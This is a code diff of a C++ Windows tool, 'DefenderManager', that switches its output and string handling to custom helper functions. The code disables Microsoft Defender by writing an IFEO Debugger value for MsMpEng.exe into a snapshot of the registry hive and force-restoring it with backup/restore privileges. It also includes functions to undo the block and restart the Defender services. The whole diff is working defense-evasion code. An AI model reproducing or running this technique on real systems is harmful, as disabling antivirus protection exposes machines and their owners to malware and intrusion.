@@ -1,11 +1,10 @@
 #include "DefenderManager.h"
+#include "Console.h"
+#include "StrUtils.h"
+#include "RuntimeSupport.h"
 
 #include <windows.h>
 #include <tlhelp32.h>
-#include <filesystem>
-#include <iostream>
-
-namespace fs = std::filesystem;
 
 // ============================================================================
 // LOCAL HELPERS
@@ -27,14 +26,17 @@ static bool EnablePrivilege(LPCWSTR privilege) noexcept
     return ok;
 }
 
-static std::wstring GetTempDir() noexcept
+static bool GetTempDir(wchar_t* out, size_t cap) noexcept
 {
-    wchar_t buf[MAX_PATH];
-    DWORD len = GetTempPathW(MAX_PATH, buf);
-    if (!len) return L"C:\\Windows\\Temp";
-    std::wstring p = buf;
-    if (!p.empty() && p.back() == L'\\') p.pop_back();
-    return p;
+    DWORD len = GetTempPathW(static_cast<DWORD>(cap), out);
+    if (!len || len >= cap) {
+        StrUtils::StrCopy(out, cap, L"C:\\Windows\\Temp");
+        return true;
+    }
+    if (len > 0 && out[len - 1] == L'\\') {
+        out[len - 1] = L'\0';
+    }
+    return true;
 }
 
 // ============================================================================
@@ -43,61 +45,61 @@ static std::wstring GetTempDir() noexcept
 
 bool DefenderManager::DisableSecurityEngine() noexcept
 {
-    std::wcout << L"[*] Adding IFEO block for MsMpEng.exe...\n";
+    Console::DbgPrintLine(L"[*] Adding IFEO block for MsMpEng.exe...");
 
     if (!EnableRequiredPrivileges()) {
-        std::wcout << L"[!] Failed to enable SE_BACKUP_NAME/SE_RESTORE_NAME\n";
+        Console::PrintLine(L"[!] Failed to enable SE_BACKUP_NAME/SE_RESTORE_NAME");
         return false;
     }
 
     HiveContext ctx;
     if (!CreateIFEOSnapshot(ctx)) {
-        std::wcout << L"[!] Failed to create IFEO hive snapshot\n";
+        Console::PrintLine(L"[!] Failed to create IFEO hive snapshot");
         return false;
     }
     if (!ModifyMsMpEngIFEO(ctx, true)) {
-        std::wcout << L"[!] Failed to set Debugger value in temp hive\n";
+        Console::PrintLine(L"[!] Failed to set Debugger value in temp hive");
         return false;
     }
     if (!RestoreIFEOSnapshot(ctx)) {
-        std::wcout << L"[!] Failed to restore IFEO hive\n";
+        Console::PrintLine(L"[!] Failed to restore IFEO hive");
         return false;
     }
 
-    std::wcout << L"[+] IFEO block set\n";
+    Console::DbgPrintLine(L"[+] IFEO block set");
     return true;
 }
 
 bool DefenderManager::EnableSecurityEngine() noexcept
 {
-    std::wcout << L"[*] Removing IFEO block for MsMpEng.exe...\n";
+    Console::DbgPrintLine(L"[*] Removing IFEO block for MsMpEng.exe...");
 
     if (!EnableRequiredPrivileges()) {
-        std::wcout << L"[!] Failed to enable SE_BACKUP_NAME/SE_RESTORE_NAME\n";
+        Console::PrintLine(L"[!] Failed to enable SE_BACKUP_NAME/SE_RESTORE_NAME");
         return false;
     }
 
     HiveContext ctx;
     if (!CreateIFEOSnapshot(ctx)) {
-        std::wcout << L"[!] Failed to create IFEO hive snapshot\n";
+        Console::PrintLine(L"[!] Failed to create IFEO hive snapshot");
         return false;
     }
     if (!ModifyMsMpEngIFEO(ctx, false)) {
-        std::wcout << L"[!] Failed to remove Debugger value from temp hive\n";
+        Console::PrintLine(L"[!] Failed to remove Debugger value from temp hive");
         return false;
     }
     if (!RestoreIFEOSnapshot(ctx)) {
-        std::wcout << L"[!] Failed to restore IFEO hive\n";
+        Console::PrintLine(L"[!] Failed to restore IFEO hive");
         return false;
     }
 
-    std::wcout << L"[+] IFEO block removed\n";
+    Console::DbgPrintLine(L"[+] IFEO block removed");
 
-    std::wcout << L"[*] Starting WinDefend service...\n";
+    Console::DbgPrintLine(L"[*] Starting WinDefend service...");
     if (StartWinDefend()) {
-        std::wcout << L"[+] WinDefend started\n";
+        Console::DbgPrintLine(L"[+] WinDefend started");
     } else {
-        std::wcout << L"[-] WinDefend could not be started\n";
+        Console::DbgPrintLine(L"[-] WinDefend could not be started");
     }
 
     SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
@@ -106,9 +108,9 @@ bool DefenderManager::EnableSecurityEngine() noexcept
         if (hHealth) {
             if (StartServiceW(hHealth, 0, nullptr) ||
                 GetLastError() == ERROR_SERVICE_ALREADY_RUNNING)
-                std::wcout << L"[+] SecurityHealthService started\n";
+                Console::DbgPrintLine(L"[+] SecurityHealthService started");
             else
-                std::wcout << L"[-] SecurityHealthService could not be started\n";
+                Console::DbgPrintLine(L"[-] SecurityHealthService could not be started");
             CloseServiceHandle(hHealth);
         }
         CloseServiceHandle(hSCM);
@@ -119,7 +121,7 @@ bool DefenderManager::EnableSecurityEngine() noexcept
     PROCESS_INFORMATION pi{};
     if (CreateProcessW(L"C:\\Windows\\System32\\SecurityHealthSystray.exe",
                        nullptr, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi)) {
-        std::wcout << L"[+] SecurityHealthSystray.exe launched\n";
+        Console::DbgPrintLine(L"[+] SecurityHealthSystray.exe launched");
         CloseHandle(pi.hThread);
         CloseHandle(pi.hProcess);
     }
@@ -138,6 +140,7 @@ DefenderManager::DefenderStatus DefenderManager::QueryStatus() noexcept
     s.ifeoBlocked      = false;
     s.winDefendRunning = false;
     s.msmpengRunning   = false;
+    s.ifeoDebugger[0]  = L'\0';
 
     HKEY hKey = nullptr;
     if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, MSMPENG_SUBKEY,
@@ -148,8 +151,8 @@ DefenderManager::DefenderStatus DefenderManager::QueryStatus() noexcept
         if (RegQueryValueExW(hKey, DEBUGGER_VALUE, nullptr, &type,
                              reinterpret_cast<LPBYTE>(buf), &sz) == ERROR_SUCCESS
             && type == REG_SZ) {
-            s.ifeoBlocked  = true;
-            s.ifeoDebugger = buf;
+            s.ifeoBlocked = true;
+            StrUtils::StrCopy(s.ifeoDebugger, MAX_PATH, buf);
         }
         RegCloseKey(hKey);
     }
@@ -200,13 +203,12 @@ bool DefenderManager::EnableRequiredPrivileges() noexcept
 
 bool DefenderManager::CreateIFEOSnapshot(HiveContext& ctx) noexcept
 {
-    ctx.tempPath = GetTempDir();
-    if (ctx.tempPath.empty()) return false;
+    if (!GetTempDir(ctx.tempPath, MAX_PATH)) return false;
 
-    ctx.hiveFile = ctx.tempPath + L"\\Ifeo.hiv";
+    StrUtils::StrCopy(ctx.hiveFile, MAX_PATH, ctx.tempPath);
+    StrUtils::StrConcat(ctx.hiveFile, MAX_PATH, L"\\Ifeo.hiv");
 
-    if (fs::exists(ctx.hiveFile))
-        DeleteFileW(ctx.hiveFile.c_str());
+    DeleteFileW(ctx.hiveFile);
 
     HKEY hCheck = nullptr;
     if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, TEMP_HIVE_NAME,
@@ -218,20 +220,21 @@ bool DefenderManager::CreateIFEOSnapshot(HiveContext& ctx) noexcept
     HKEY hIfeo = nullptr;
     if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, IFEO_KEY,
                       0, KEY_READ, &hIfeo) != ERROR_SUCCESS) {
-        std::wcout << L"[!] Cannot open IFEO registry key\n";
+        Console::PrintLine(L"[!] Cannot open IFEO registry key");
         return false;
     }
 
-    LONG r = RegSaveKeyExW(hIfeo, ctx.hiveFile.c_str(), nullptr, REG_LATEST_FORMAT);
+    LONG r = RegSaveKeyExW(hIfeo, ctx.hiveFile, nullptr, REG_LATEST_FORMAT);
     RegCloseKey(hIfeo);
     if (r != ERROR_SUCCESS) {
-        std::wcout << L"[!] RegSaveKeyEx failed: " << r << L"\n";
+        Console::Print(L"[!] RegSaveKeyEx failed: ");
+        Console::PrintInt(r);
+        Console::PrintLine();
         return false;
     }
 
-    if (RegLoadKeyW(HKEY_LOCAL_MACHINE, TEMP_HIVE_NAME,
-                    ctx.hiveFile.c_str()) != ERROR_SUCCESS) {
-        std::wcout << L"[!] RegLoadKey failed\n";
+    if (RegLoadKeyW(HKEY_LOCAL_MACHINE, TEMP_HIVE_NAME, ctx.hiveFile) != ERROR_SUCCESS) {
+        Console::PrintLine(L"[!] RegLoadKey failed");
         return false;
     }
 
@@ -247,38 +250,47 @@ bool DefenderManager::ModifyMsMpEngIFEO(const HiveContext& /*ctx*/, bool addBloc
     };
 
     for (size_t i = 0; i < 3; ++i) {
-        const std::wstring keyPath = std::wstring(TEMP_HIVE_NAME) + L"\\" + targets[i];
+        wchar_t keyPath[MAX_PATH];
+        StrUtils::StrCopy(keyPath, MAX_PATH, TEMP_HIVE_NAME);
+        StrUtils::StrConcat(keyPath, MAX_PATH, L"\\");
+        StrUtils::StrConcat(keyPath, MAX_PATH, targets[i]);
+
         const bool required = (i == 0);
 
         if (addBlock) {
             HKEY hKey = nullptr;
-            LONG r = RegCreateKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(),
+            LONG r = RegCreateKeyExW(HKEY_LOCAL_MACHINE, keyPath,
                                      0, nullptr, REG_OPTION_NON_VOLATILE,
                                      KEY_WRITE, nullptr, &hKey, nullptr);
             if (r != ERROR_SUCCESS) {
                 if (required) {
-                    std::wcout << L"[!] RegCreateKeyEx on TempIFEO\\" << targets[i]
-                               << L" failed: " << r << L"\n";
+                    Console::Print(L"[!] RegCreateKeyEx on TempIFEO\\");
+                    Console::Print(targets[i]);
+                    Console::Print(L" failed: ");
+                    Console::PrintInt(r);
+                    Console::PrintLine();
                     return false;
                 }
                 continue;
             }
-            const DWORD sz = static_cast<DWORD>((wcslen(DEBUGGER_PAYLOAD) + 1) * sizeof(wchar_t));
+            const DWORD sz = static_cast<DWORD>((StrUtils::StrLen(DEBUGGER_TARGET) + 1) * sizeof(wchar_t));
             r = RegSetValueExW(hKey, DEBUGGER_VALUE, 0, REG_SZ,
-                               reinterpret_cast<const BYTE*>(DEBUGGER_PAYLOAD), sz);
+                               reinterpret_cast<const BYTE*>(DEBUGGER_TARGET), sz);
             RegCloseKey(hKey);
             if (r != ERROR_SUCCESS && required) {
-                std::wcout << L"[!] RegSetValueEx Debugger failed: " << r << L"\n";
+                Console::Print(L"[!] RegSetValueEx Debugger failed: ");
+                Console::PrintInt(r);
+                Console::PrintLine();
                 return false;
             }
         } else {
             HKEY hKey = nullptr;
-            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(),
+            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath,
                               0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
                 RegDeleteValueW(hKey, DEBUGGER_VALUE);
                 RegCloseKey(hKey);
             }
-            RegDeleteKeyW(HKEY_LOCAL_MACHINE, keyPath.c_str());
+            RegDeleteKeyW(HKEY_LOCAL_MACHINE, keyPath);
         }
     }
 
@@ -288,19 +300,21 @@ bool DefenderManager::ModifyMsMpEngIFEO(const HiveContext& /*ctx*/, bool addBloc
 bool DefenderManager::RestoreIFEOSnapshot(const HiveContext& ctx) noexcept
 {
     if (RegUnLoadKeyW(HKEY_LOCAL_MACHINE, TEMP_HIVE_NAME) != ERROR_SUCCESS)
-        std::wcout << L"[!] Warning: RegUnLoadKey(TempIFEO) failed\n";
+        Console::PrintLine(L"[!] Warning: RegUnLoadKey(TempIFEO) failed");
 
     HKEY hIfeo = nullptr;
     if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, IFEO_KEY,
                       0, KEY_WRITE, &hIfeo) != ERROR_SUCCESS) {
-        std::wcout << L"[!] Cannot open IFEO key for restore\n";
+        Console::PrintLine(L"[!] Cannot open IFEO key for restore");
         return false;
     }
 
-    LONG r = RegRestoreKeyW(hIfeo, ctx.hiveFile.c_str(), REG_FORCE_RESTORE);
+    LONG r = RegRestoreKeyW(hIfeo, ctx.hiveFile, REG_FORCE_RESTORE);
     RegCloseKey(hIfeo);
     if (r != ERROR_SUCCESS) {
-        std::wcout << L"[!] RegRestoreKey failed: " << r << L"\n";
+        Console::Print(L"[!] RegRestoreKey failed: ");
+        Console::PrintInt(r);
+        Console::PrintLine();
         return false;
     }
 
@@ -340,7 +354,7 @@ bool DefenderManager::IsMsMpEngRunning() noexcept
     bool found = false;
     if (Process32FirstW(hSnap, &pe)) {
         do {
-            if (_wcsicmp(pe.szExeFile, L"MsMpEng.exe") == 0) {
+            if (StrUtils::StrEqualNoCase(pe.szExeFile, L"MsMpEng.exe")) {
                 found = true;
                 break;
             }
@@ -373,26 +387,44 @@ bool DefenderManager::IsWinDefendRunning() noexcept
 
 void DefenderManager::HiveContext::Cleanup() noexcept
 {
-    if (hiveFile.empty()) return;
+    if (hiveFile[0] == L'\0') return;
 
-    for (const auto& path : {
-            hiveFile,
-            hiveFile + L".LOG1",
-            hiveFile + L".LOG2",
-            hiveFile + L".blf" }) {
-        DeleteFileW(path.c_str());
+    RegUnLoadKeyW(HKEY_LOCAL_MACHINE, TEMP_HIVE_NAME);
+
+    DeleteFileW(hiveFile);
+
+    wchar_t pathBuf[MAX_PATH];
+    static const wchar_t* const exts[] = { L".LOG1", L".LOG2", L".blf" };
+    for (int i = 0; i < 3; ++i) {
+        StrUtils::StrCopy(pathBuf, MAX_PATH, hiveFile);
+        StrUtils::StrConcat(pathBuf, MAX_PATH, exts[i]);
+        DeleteFileW(pathBuf);
     }
 
-    try {
-        const fs::path hiveDir  = fs::path(hiveFile).parent_path();
-        const std::wstring base = fs::path(hiveFile).filename().wstring();
-        for (const auto& entry : fs::directory_iterator(hiveDir)) {
-            const std::wstring fname = entry.path().filename().wstring();
-            if (fname.size() > base.size() &&
-                _wcsnicmp(fname.c_str(), base.c_str(), base.size()) == 0 &&
-                fname[base.size()] == L'{') {
-                DeleteFileW(entry.path().c_str());
-            }
+    StrUtils::StrCopy(pathBuf, MAX_PATH, hiveFile);
+    StrUtils::StrConcat(pathBuf, MAX_PATH, L".*");
+
+    WIN32_FIND_DATAW fd{};
+    HANDLE hFind = FindFirstFileW(pathBuf, &fd);
+    if (hFind != INVALID_HANDLE_VALUE) {
+        wchar_t dir[MAX_PATH];
+        StrUtils::StrCopy(dir, MAX_PATH, hiveFile);
+        wchar_t* lastSlash = nullptr;
+        for (wchar_t* p = dir; *p; ++p) {
+            if (*p == L'\\') lastSlash = p;
         }
-    } catch (...) {}
+        if (lastSlash) *(lastSlash + 1) = L'\0';
+
+        do {
+            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+                wchar_t fullPath[MAX_PATH];
+                StrUtils::StrCopy(fullPath, MAX_PATH, dir);
+                StrUtils::StrConcat(fullPath, MAX_PATH, fd.cFileName);
+                DeleteFileW(fullPath);
+            }
+        } while (FindNextFileW(hFind, &fd));
+        FindClose(hFind);
+    }
+
+    hiveFile[0] = L'\0';
 }
